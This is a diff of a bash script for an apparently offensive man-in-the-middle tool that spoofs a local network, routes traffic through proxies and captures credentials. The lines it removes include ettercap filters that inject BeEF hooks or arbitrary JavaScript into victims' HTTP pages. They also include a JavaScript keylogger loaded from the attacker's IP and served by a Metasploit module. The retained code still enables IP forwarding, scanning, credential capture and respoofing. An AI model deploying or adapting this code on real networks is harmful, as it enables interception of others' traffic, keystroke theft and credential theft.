@@ -97,21 +97,7 @@ fi
 if   [[ $inpt =~ '-o' ]] || [[ $inpt =~ '--savelog'    ]] ; then
    savelog=$( echo $inpt | sed 's/ /\n/g' | grep -e '-o' -e '--savelog' -A 1 | awk NR==2 )
 fi
-if   [[ $inpt =~ '-l' ]] || [[ $inpt =~ '--js-url'     ]] ; then
-   etter='on'
-   etter_beef='on'
-   js_url=$( echo $inpt | sed 's/ /\n/g' | grep -e '-l' -e '--js-url'  -A 1 | awk NR==2 )
-fi
-if   [[ $inpt =~ '-L' ]] || [[ $inpt =~ '--js-code'    ]] ; then
-   etter='on'
-   etter_code='on'
-   js_code_file=$( echo $inpt | sed 's/ /\n/g' | grep -e '-L' -e '--js-code' -A 1 | awk NR==2 )
-   js_code=$(cat $js_code_file)
-fi
-if   [[ $inpt =~ '-w' ]] || [[ $inpt =~ '--mitmproxy-args' ]] ; then
-   arg1=$( echo $inpt | sed 's/-w/Q/g' | sed 's/--mitmproxy-args/Q/g' )
-   proxyargs=$( echo $arg1 | cut -d 'Q' -f2 )
-fi
+
 if [[ $( echo $inpt | grep -w '\-d' ) =~ '-d' ]] ||  [[ $inpt == '--driftnet' ]] ; then
    driftnet='on'
 fi
@@ -139,19 +125,12 @@ fi
 if [[ $inpt =~ '-r' ]] || [[ $inpt =~ '--iptraf' ]] ; then
    iptraf='on'
 fi
-if [[ $( echo $inpt | grep -w '\-a' ) =~ '-a' ]] || [[ $inpt =~ '--etherape' ]] ; then
-   etherape='on'
-fi
+
 if [[ $inpt =~ '-K' ]] || [[ $inpt =~ '--tshark+' ]] ; then
    tshark2='on'
 fi
-if [[ $inpt =~ '-G' ]] || [[ $inpt =~ '--js-keylogger' ]] ; then
-   jskey='on'
-   etter='on'
-fi
-if [[ $inpt =~ '-X' ]] || [[ $inpt =~ '--mitmproxy' ]] ; then
-   mitmproxy='on'
-elif [[ $inpt =~ '-x' ]] || [[ $inpt =~ '--burp' ]] ; then
+
+if [[ $inpt =~ '-x' ]] || [[ $inpt =~ '--burp' ]] ; then
    burp='on'
 elif [[ $inpt =~ '-H' ]] || [[ $inpt =~ '--hsts' ]] ; then
    hsts='on'
@@ -277,7 +256,7 @@ function scan {
          let xx+=10
          let xxx+=10
       done
-    elif [[ $target =~ `echo $gateway | cut -d "." -f1,2,3` ]] ; then
+   elif [[ $target =~ `echo $gateway | cut -d "." -f1,2,3` ]] ; then
        function action
        {
           if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
@@ -397,99 +376,20 @@ function capture_creds {
       fi
    fi
 }
-function ettercap_conf {
-   cd ../../ettercap_filter_conf
-   mv /etc/ettercap/etter.conf /etc/ettercap/etter.conf.copy
-   cp etter.conf /etc/ettercap/etter.conf
-   echo -e "${yellow}█ Configure etter.conf file"
-   if [[ -f mod.filter ]] ; then rm mod.filter ; fi
-   echo 'if (ip.proto == TCP && tcp.dst == 80) {' > mod.filter
-   echo '    if (search(DATA.data, "Accept-Encoding")) {' >> mod.filter
-   echo '      replace("Accept-Encoding", "Accept-Nothing!");' >> mod.filter
-   echo '    }' >> mod.filter
-   echo '}' >> mod.filter
-}
-function ettercap_beef {
-   js2=$( echo $js_url | sed 's/\./\\./g' | sed 's/\//\\\//g' )
-   beef_script="<script src=\"$js2\"></script>"
-   echo -e "${yellow}█ start URL injection with $js_url URL"
-}
-function ettercap_code {
-   code_script="<script>$js_code</script>"
-   echo -e "${yellow}█ start code injection with $js_code code"
-}
-function keylog {
-   echo -e "${yellow}█ start JS keylogging"
-   keylog_script="<script src=\"http://$myip:8080/support\"></script>"
-}
 
-if [[ $silent == "on" ]] || [[ $silent == "ON" ]] ; then
-   echo -e "${purp}█ Activate silent mode "
-fi
-if [[ $forward == "off" ]] ; then
-    echo -e "${purp}█ echo 0 > /proc/sys/net/ipv4/ip_forward"
-    echo 0 > /proc/sys/net/ipv4/ip_forward
-    scan
-elif [[ $etter == 'on' ]] ; then
-   ettercap_conf
-   scripts=""
-   if [[ $etter_code == 'on' ]] ; then
-      ettercap_code
-      scripts="${scripts}${code_script}"
-   fi
-   if [[ $jskey == "on" ]] ; then
-      keylog
-      scripts="${scripts}${keylog_script}"
-   fi
-   if [[ $etter_beef == 'on' ]] ; then
-      ettercap_beef
-      scripts="${scripts}${beef_script}"
-   fi
-   echo "if (ip.proto == TCP && tcp.src == 80) {" >> mod.filter
-   echo "   if (search(DATA.data, \"<head>\")) {" >> mod.filter
-   echo "        replace(\"<head>\", '<head>$scripts');" >> mod.filter
-   echo "   }" >> mod.filter
-   echo "}" >> mod.filter
-   if [[ -f stt ]] ; then rm -rf stt ; fi
-   etterfilter mod.filter -o mod.ef 2>> stt 1>> stt
-   if [[ $( cat stt ) =~ "syntax error" ]] || [[ $( cat stt ) =~ "not recognized" ]] ; then
-      echo -e "${red}█ Etterfilter can't make ettercap filter, is your js script all on the same line ?"
-      exit
-   else
-      etterfilter mod.filter 2> /dev/null 1> /dev/null
-   fi
-   xterm -geometry 90x15+0+100 -fg green -e 'ettercap -T -F mod.ef' &
-   cd ../output/"${date}_output"
-   scan
-   capture_creds
-   if [[ $jskey == "on" ]] ; then
-      xterm -geometry 100x100+0-0 -fg red -T keylogger -e msfconsole -x "use auxiliary/server/capture/http_javascript_keylogger; set DEMO 0; set LHOST $myip; set URIPATH support; exploit" &
-   fi
-else
-    if [[ $hsts == 'on' ]] ; then
-       if [[ $burp == 'on' ]] || [[ $mitmproxy == 'on' ]]; then
-          echo -e "${red}█ You can't run burpsuite mode or MITMproxy mode accompanied with HSTS mode"
-          echo "█ Exit"
-          exit
-       else
-          echo -e "$red█ Activate HSTS mode "
-          iptables_hsts
-          dns_2_proxy
-       fi
-    elif [[ $burp == 'on' ]] ; then
-       echo -e "${red}█ Activate Burp mode "
+
+if [[ $hsts == 'on' ]] ; then
+       echo -e "$red█ Activating HSTS mode "
+       iptables_hsts
+       dns_2_proxy
+elif [[ $burp == 'on' ]] ; then
+       echo -e "${red}█ Activating Burp mode "
        iptables_burp
-    elif [[ $mitmproxy == 'on' ]] ; then
-       echo -e "${red}█ Activate mitmproxy mode "
-       kill $(fuser 443/tcp | cut -d ":" -f 2) 2> /dev/null 1> /dev/null
-       kill $(fuser 80/tcp | cut -d ":" -f 2) 2> /dev/null 1> /dev/null
-       iptables_burp
-    fi
-    echo -e "${purp}█ echo 1 > /proc/sys/net/ipv4/ip_forward"
-    echo 1 > /proc/sys/net/ipv4/ip_forward
-    scan
-    capture_creds
 fi
+echo -e "${purp}█ echo 1 > /proc/sys/net/ipv4/ip_forward"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+scan
+capture_creds
 if [[ $nocheck != "on" ]] ; then
    echo -e "${blue}█ Activating respoofer, My gift to the MITM world :)"
    xterm -geometry 90x15-0-0 -fg green -T respoofer -e bash -c "../../respoof.sh $interface" &
@@ -507,12 +407,6 @@ while true ; do
        for i in $( ps -aux | grep dns2proxy | awk {' print $2 '} ) ; do
           kill $i 2> /dev/null 1> /dev/null
        done
-       if [[ $etter == 'on' ]] ; then
-           echo -e "${yellow}█ Restore etter.conf default settings"
-           rm /etc/ettercap/etter.conf
-           mv /etc/ettercap/etter.conf.copy /etc/ettercap/etter.conf
-           sed -i 's/redir_command/#redir_command/g' /etc/ettercap/etter.conf
-       fi
        if [[ $dnsspoof == "on" ]] ; then
           cd ../../dns2proxy
           echo "" > domains.cfg
@@ -521,12 +415,8 @@ while true ; do
        fi
        if [[ $driftnet == "on" ]] || [[ $driftnet == "ON" ]] ; then
           echo -e "$blue█ Extracting photos from pcap file with drifnet"
-          timeout 30 driftnet -f tshark.pcap -a -d . 2> /dev/null 1> /dev/null
+          timeout 60 driftnet -f tshark.pcap -a -d . 2> /dev/null 1> /dev/null
        fi
-       if [[ $etherape == "on" ]] ; then
-          kill `pgrep etherape` 2> /dev/null 1> /dev/null
-       fi
-       echo -e "${purp}█ Goodbye :) "
        exit
     fi
 done
